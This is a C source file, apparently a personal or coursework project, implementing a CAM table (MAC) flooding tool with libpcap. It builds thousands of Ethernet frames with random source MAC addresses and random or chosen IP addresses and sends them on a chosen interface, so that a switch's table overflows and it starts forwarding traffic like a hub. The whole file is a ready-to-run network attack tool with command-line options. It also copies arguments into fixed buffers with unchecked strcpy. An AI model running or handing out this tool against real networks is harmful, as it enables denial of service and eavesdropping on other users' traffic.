#include <linux/if_ether.h> 
#include <net/ethernet.h> 
#include <pcap/pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <pcap.h>
#include <netinet/ip.h> 
#include "cam_flood.h"

#define ETHER_HEADER_LEN 14

// Function to convert MAC address string to u_char[6] array
void stringToMac(const char *macStr, u_char *mac) {
    sscanf(macStr, "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

void generate_random_mac(u_char *mac_addr) {
    // sends a 8 bit number back that will have to be converted to a mac_address automatically as ether_header takes as types u_char
    for (int i = 0 ; i < ETH_ALEN ; i++) {
        mac_addr[i] = rand() % 256;
    }
    // FIXME : mac addresses to be accepted by the interfaces must validate certain conditions so as they are recognized as being made by a constructor
}

int generate_random_numbers(){
    return rand() % 256;
}

void generate_random_ip(char *ip_addr) {
    sprintf(ip_addr, "%d.%d.%d.%d", generate_random_numbers(), generate_random_numbers(), generate_random_numbers(), generate_random_numbers());
}

// Function to calculate IPv4 header checksum from chatGPT
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len == 1) {
        sum += *(unsigned char *)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    return (unsigned short)~sum;
}


void generate_ip_payload(struct ip *ip_header, char *SRC_IP, char *DST_IP) {
    // Create an IPv4 header and populate its fields
    ip_header->ip_hl = 5; // Header length (in 32-bit words)
    ip_header->ip_v = 4; // IPv4 version
    ip_header->ip_tos = 0; // Type of Service
    ip_header->ip_len = htons(sizeof(struct ip) + 0); // Total length (in bytes)
    ip_header->ip_id = htons(rand() % 65535); // Identification
    ip_header->ip_off = 0; // Fragment offset
    ip_header->ip_ttl = 255; // Time to Live
    ip_header->ip_p = IPPROTO_TCP; // Protocol (e.g., TCP)
    ip_header->ip_sum = 0; // Checksum (initialized to 0 for calculation)
    char ip_src[16]; 
    //if (strlen(SRC_IP) == 0) {
    if (strcmp(SRC_IP, "0") == 0) {
        generate_random_ip(ip_src);
    } else {
        strcpy(ip_src, SRC_IP);
    }
    ip_header->ip_src.s_addr = inet_addr(ip_src);
    
    char ip_dst[16];
    if (strcmp(DST_IP, "0") == 0) {
        generate_random_ip(ip_dst);
    } else {
        strcpy(ip_dst, DST_IP);
    }
    ip_header->ip_dst.s_addr = inet_addr(ip_dst);

    // TODO : generate a random trailer (it's what macof does) as a payload but i think what i did is ok. 
    // Calculate and set the IPv4 header checksum
    ip_header->ip_sum = checksum((unsigned short *)ip_header, sizeof(struct ip));
}


void generate_basic_packets(struct ether_header *packet_list, int num_packets, u_char *THA, int assigned) {
    // to be faster it is best to have all the packets already generated before the beginning of the attack
    for (int i = 0; i < num_packets ; i ++) {
        if (assigned == 1) {
            for (int j = 0 ; j < ETHER_ADDR_LEN ; j ++) {
                packet_list[i].ether_dhost[j] = THA[j];
            }
        } else {
            generate_random_mac(packet_list[i].ether_dhost);
        }
        generate_random_mac(packet_list[i].ether_shost);
        packet_list[i].ether_type=htons(0x0800); // 0x0800 is to use ipv4 payload ; 
        // htons function converts the unsigned short integer hostshort from host byte order to network byte order
    }
}


void generate_complex_packets(struct ether_header *packet_list, unsigned char **eth_frames, int num_packets, char SRC_IP[], char DST_IP[]) {
    for (int i = 0; i < num_packets; i++) {
        memcpy(eth_frames[i], &packet_list[i], ETHER_HEADER_LEN);
        
        // Dynamically allocate memory for the IP header
        //struct ip *ip_header = malloc(sizeof(struct ip));
        struct ip *ip_header = (struct ip *)malloc(sizeof(struct ip));

        if (ip_header == NULL) {
            // Handle allocation failure
            perror("Failed to allocate memory for IP header");
            exit(EXIT_FAILURE);
        }

        // Generate the IP payload and populate the IP header
        generate_ip_payload(ip_header, SRC_IP, DST_IP);

        // Copy the IP header into the Ethernet frame buffer
        memcpy(eth_frames[i] + ETHER_HEADER_LEN, ip_header, sizeof(struct ip));

        // Free the dynamically allocated memory for the IP header
        free(ip_header);
    }
}



void cam_complex_overflow(unsigned char **eth_frames, int num_packets, char *INTERFACE, size_t frame_len) {    
    pcap_t *handle;
    char errbuf[PCAP_ERRBUF_SIZE];
    handle = pcap_open_live(INTERFACE, BUFSIZ, 1, 1000, errbuf); // https://github.com/the-tcpdump-group/libpcap/issues/1117 seems better with non local devices
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", INTERFACE, errbuf);
        exit(EXIT_FAILURE); // as the handle was not opened
    }

    for (int i = 0 ; i < num_packets ; i++) {
        if (pcap_sendpacket(handle, (const u_char *)eth_frames[i], frame_len) != 0) {
            printf("The switch has killed our port\n");
            //printf(&eth_frames[i]);
            exit(EXIT_FAILURE);
        } 
    }
    pcap_close(handle);
}


int main(int argc, char *argv[]) {
    //printf("started\n");
    int PACKET_COUNT = 10000; // default values
    char *INTERFACE = "eth0"; // default values
    char SRC_IP[16] = "0";
    char DST_IP[16] = "0";
    u_char THA[ETHER_ADDR_LEN] = {0};
    // TODO : search for all the interfaces that could seem like internet but have weird names (zB  : enps) instead of fixing it to eth0 
        if (argc > 1) {
        if (strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0) {
            // Print help message
            usage:
            printf("Usage: %s [options] \n", argv[0]);
            printf("Options:\n");
            printf("  -h, --help        Display this help message\n");
            printf("  -n, --number      Number of packets to send (default 10000)\n");
            printf("  -i, --interface   Interface on which to do the attack (default 'eth0')\n");
            printf("  -s, --src         Specify source IP address (default random for each packet)\n");
            printf("  -d, --dst         Specify destination IP address (default random for each packet)\n");
            printf("  -e, --target      Specify taget mac address (default random for each packet)\n");

            return 0;
        }
        for (int i = 1; i < argc ; i++){
            if (strcmp(argv[i], "-n") == 0 || strcmp(argv[i], "--number") == 0) {
                if (strlen(argv[i+1]) > 4 ){
                    printf("Don't abuse you wont need more than 10^4 packets, as I am nice i put 10000 packets, but beware of trying to buffer overflow me again !\n");
                } else {
				    PACKET_COUNT = atoi(argv[i+1]);
                }
                i++;
            } else if (strcmp(argv[i], "-i") == 0 || strcmp(argv[i], "--interface") == 0) {
                INTERFACE = argv[i+1];
                i++;
            } else if (strcmp(argv[i], "-s") == 0 || strcmp(argv[i], "--src") == 0) {
                strcpy(SRC_IP, argv[i+1]);
                i++;
            } else if (strcmp(argv[i], "-d") == 0 || strcmp(argv[i], "--dst") == 0) {
                strcpy(DST_IP, argv[i+1]);
                i++;
            } else if (strcmp(argv[i], "-e") == 0 || strcmp(argv[i], "--target") == 0) {
                stringToMac(argv[i+1], THA);
                i++;
            } else {
                goto usage; // in case of invalid arguments
            }
        }
        // FIXME : j'ai un problème avec mes src_ip a corriger
    }
    struct ether_header packet_list[PACKET_COUNT];
    struct ip ip_header;
    memset(&ip_header, 0, sizeof(struct ip));


    // additions to have a valid ip payload
    size_t frame_len = ETHER_HEADER_LEN + sizeof(struct ip);
    
    // Allocate memory for the Ethernet frame buffer
    //unsigned char *eth_frame = (unsigned char *)malloc(frame_len);
    //unsigned char **eth_frames = (unsigned char **)malloc(PACKET_COUNT * sizeof(frame_len));
    unsigned char **eth_frames = (unsigned char **)malloc(PACKET_COUNT * sizeof(unsigned char *));
    if (eth_frames == NULL) {
        printf("couldn't malloc the eth_frames list of pointers\n");
        return 1;
    }
    for (int i = 0 ; i < PACKET_COUNT ; i++) {
        eth_frames[i] = (unsigned char *)malloc(frame_len);
        if (eth_frames[i] == NULL) {
            // Error handling if malloc fails to allocate memory for a specific frame
            // Print an error message, free previously allocated memory, return an error code, or handle the error in any appropriate way
            printf("couldn't malloc the frames\n");
            return 1;
        }
    }


    int assigned = 0;
    for (int i = 0 ; i < ETHER_ADDR_LEN ; i++) {
        if (THA[i] != 0) {
            assigned = 1;
            break;
        }
    }

    generate_basic_packets(packet_list, PACKET_COUNT, THA, assigned);
    //printf("first step ok\n");
    generate_complex_packets(packet_list, eth_frames, PACKET_COUNT, SRC_IP, DST_IP);
    //printf("second step ok\n");
    //cam_overflow(packet_list, PACKET_COUNT, INTERFACE);
    cam_complex_overflow(eth_frames, PACKET_COUNT, INTERFACE, frame_len);
    printf("CAM flooding seems to be a success, switch should behave like a hub\n");
    for (int i = 0; i < PACKET_COUNT ; i++) {
        free(eth_frames[i]);
    }
    free(eth_frames);
    return 0;
}
